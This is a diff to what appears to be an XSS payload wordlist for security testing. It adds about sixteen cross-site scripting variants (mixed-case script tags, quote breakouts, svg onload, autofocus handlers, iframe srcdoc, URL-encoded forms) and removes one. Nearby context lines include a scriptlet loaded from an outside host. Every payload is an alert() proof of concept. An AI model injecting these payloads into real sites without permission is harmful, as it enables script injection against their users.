@@ -30,7 +30,6 @@ javascript:alert(1)
 <div style="width:expression(alert(1))">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
 \x3Cscript\x3Ealert(1)\x3C/script\x3E
-<ScRiPt>alert(1)</ScRiPt>
 <svg><animate onbegin=alert(1) attributeName=x dur=1s>
 <math><mtext></mtext><script>alert(1)</script></math>
 \"><img src=x onerror=alert(document.domain)>
@@ -38,3 +37,21 @@ javascript:alert(1)
 %22%3E%3Csvg%2Fonload%3Dalert%281%29%3E
 &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
 javascript:alert(document.domain)
+
+# Curated context variants inspired by payload-box/xss-payload-list
+<SCRIPT>alert(2)</SCRIPT>
+<sCrIpT>alert(document.domain)</sCrIpT>
+"><sCrIpT>alert(2)</sCrIpT>
+'><sCrIpT>alert(2)</sCrIpT>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<video><source onerror=alert(1)></video>
+<input onfocus=alert(1) autofocus>
+<textarea autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>
+<body onpageshow=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+javascript:alert(window.origin)
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%3Csvg%2Fonload%3Dalert(1)%3E
